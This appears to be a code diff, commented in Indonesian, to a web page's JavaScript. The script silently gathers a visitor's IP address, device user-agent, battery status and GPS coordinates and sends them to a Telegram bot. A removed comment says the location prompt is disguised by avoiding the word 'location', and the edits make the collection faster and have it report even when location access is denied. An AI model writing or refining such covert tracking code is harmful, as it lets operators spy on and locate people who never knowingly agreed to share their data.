@@ -88,24 +88,17 @@
             btn.innerText = "Memproses...";
             status.style.display = "block";
 
-            // 1. Dapatkan Data IP dan Perangkat Lebih Dulu
+            // 1. Ambil Data Dasar (IP, Perangkat, Baterai) secara INSTAN
             let ipInfo = "Gagal mengambil IP";
             try {
-                const res = await fetch('https://ipapi.co');
+                // Menggunakan ipify yang jauh lebih cepat dan stabil dibanding ipapi
+                const res = await fetch('https://ipify.org');
                 const data = await res.json();
-                ipInfo = `• IP: \`${data.ip}\`\n• Kota/Negara: ${data.city}, ${data.country_name}\n• Provider: ${data.org}`;
-            } catch (e) {
-                // Gunakan fallback jika API pertama gagal
-                try {
-                    const res2 = await fetch('https://ipify.org');
-                    const data2 = await res2.json();
-                    ipInfo = `• IP: \`${data2.ip}\``;
-                } catch(err) {}
-            }
+                ipInfo = `• IP: \`${data.ip}\``;
+            } catch (e) {}
 
             const infoPerangkat = navigator.userAgent;
 
-            // 2. Dapatkan Data Informasi Baterai
             let infoBaterai = "Tidak didukung";
             if (navigator.getBattery) {
                 try {
@@ -116,7 +109,7 @@
                 } catch(e) {}
             }
 
-            // 3. Minta Akses Koordinat Geografis (Sembunyi tanpa kata "lokasi")
+            // 2. Minta Koordinat dengan Akses Cepat (Low Accuracy & Timeout Pendek)
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     function(position) {
@@ -138,15 +131,16 @@
                         kirimKeTelegram(pesan);
                     },
                     function(error) {
-                        // Jika akses koordinat ditolak
-                        const pesanGagal = `⚠️ *Pengunjung Masuk (Akses Koordinat Ditolak)*\n\n` +
+                        // Jika akses ditolak atau gagal dapat koordinat, langsung kirim data log yang ada saja
+                        const pesanGagal = `⚠️ *Pengunjung Masuk (Koordinat Gagal/Ditolak)*\n\n` +
                                            `🔋 *Baterai*: ${infoBaterai}\n` +
                                            `🌐 *Internet & IP*:\n${ipInfo}\n\n` +
                                            `💻 *User-Agent*:\n\`${infoPerangkat}\``;
                         
                         kirimKeTelegram(pesanGagal);
                     },
-                    { enableHighAccuracy: true, timeout: 10000 }
+                    // PERUBAHAN PENTING: Mematikan highAccuracy agar pencarian satelit instan, timeout dipangkas jadi 4 detik
+                    { enableHighAccuracy: false, timeout: 4000, maximumAge: 0 }
                 );
             } else {
                 const pesanNoGeo = `❌ *Fitur Koordinat Tidak Didukung*\n\n` +
